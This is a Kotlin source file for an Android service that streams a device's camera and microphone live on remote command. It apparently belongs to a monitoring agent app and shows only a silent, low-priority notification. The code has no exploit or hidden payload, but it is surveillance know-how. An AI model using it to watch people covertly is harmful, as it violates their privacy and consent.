package com.guard.agent.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.guard.agent.R
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.helpers.media.LiveAudioStreamer
import com.guard.agent.helpers.media.LiveCameraStreamer
import com.guard.agent.helpers.media.LiveStreamHelper
import com.guard.agent.helpers.media.StreamServer
import com.guard.agent.utils.Logger

class LiveStreamService : Service() {

    companion object {
        const val TAG = "LiveStreamService"

        const val ACTION_START_CAMERA = "start_camera"
        const val ACTION_START_AUDIO = "start_audio"
        const val ACTION_START_BOTH = "start_both"
        const val ACTION_STOP = "stop"

        const val EXTRA_FPS = "fps"
        const val EXTRA_DEVICE_KEY = "device_key"

        private const val NOTIF_ID = 2001
        private const val CHANNEL_ID = "live_stream_channel"
    }

    private val deviceKey by lazy { DeviceKey.get(this) }
    private var cameraActive = false
    private var audioActive = false

    override fun onCreate() {
        super.onCreate()
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: return START_NOT_STICKY
        val key = intent.getStringExtra(EXTRA_DEVICE_KEY) ?: deviceKey

        when (action) {
            ACTION_START_CAMERA -> {
                val fps = intent.getIntExtra(EXTRA_FPS, 1)
                startForegroundSafely("Camera streaming")
                startCameraStream(key, fps)
            }
            ACTION_START_AUDIO -> {
                startForegroundSafely("Audio streaming")
                startAudioStream(key)
            }
            ACTION_START_BOTH -> {
                val fps = intent.getIntExtra(EXTRA_FPS, 1)
                startForegroundSafely("Live streaming")
                startCameraStream(key, fps)
                startAudioStream(key)
            }
            ACTION_STOP -> {
                stopAllStreams()
                stopSelf()
            }
        }

        return START_STICKY
    }

    private fun startCameraStream(key: String, fps: Int) {
        if (cameraActive) return
        try {
            StreamServer.start()
            LiveCameraStreamer.start(this, key, fps)
            cameraActive = true

            LiveStreamHelper.updateStatus(key, "camera_active", "camera")
            Logger.d(TAG, "Camera stream active")
        } catch (e: Exception) {
            Logger.e(TAG, "Camera stream failed", e)
            LiveStreamHelper.updateStatus(key, "camera_failed", "camera")
        }
    }

    private fun startAudioStream(key: String) {
        if (audioActive) return
        try {
            LiveAudioStreamer.start(this, key)
            audioActive = true

            LiveStreamHelper.updateStatus(key, "audio_active", "audio")
            Logger.d(TAG, "Audio stream active")
        } catch (e: Exception) {
            Logger.e(TAG, "Audio stream failed", e)
            LiveStreamHelper.updateStatus(key, "audio_failed", "audio")
        }
    }

    private fun stopAllStreams() {
        try {
            if (cameraActive) {
                LiveCameraStreamer.stop()
                cameraActive = false
            }
            if (audioActive) {
                LiveAudioStreamer.stop()
                audioActive = false
            }
            StreamServer.stop()
            LiveStreamHelper.updateStatus(deviceKey, "stopped")
            Logger.d(TAG, "All streams stopped")
        } catch (e: Exception) {
            Logger.e(TAG, "stopAllStreams failed", e)
        }
    }

    private fun startForegroundSafely(text: String) {
        val notif = buildNotification(text)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIF_ID,
                notif,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (mgr.getNotificationChannel(CHANNEL_ID) == null) {
                val ch = NotificationChannel(
                    CHANNEL_ID,
                    "Live Stream",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Live camera/mic streaming"
                    setShowBadge(false)
                }
                mgr.createNotificationChannel(ch)
            }
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    override fun onDestroy() {
        stopAllStreams()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
